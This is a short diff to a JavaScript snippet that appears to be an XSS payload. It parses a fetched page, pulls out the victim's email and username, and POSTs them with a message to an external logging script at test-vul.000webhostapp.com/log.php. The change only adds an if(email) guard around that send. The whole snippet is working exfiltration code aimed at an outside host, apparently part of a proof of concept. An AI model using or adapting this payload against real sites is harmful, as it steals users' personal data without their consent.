@@ -11,7 +11,9 @@ xhr.onreadystatechange = () => {
                 var dom = parser.parseFromString(xhr.responseText, "text/html")
                 var email = dom.getElementById("email").value;
                 var username = dom.getElementById("username").value;
-                xhr.open("POST","https://test-vul.000webhostapp.com/log.php");
+if(email){                
+xhr.open("POST","https://test-vul.000webhostapp.com/log.php");
+}
 xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
 
 xhr.send(`email=${email}&username=${username}&message=${message}`);
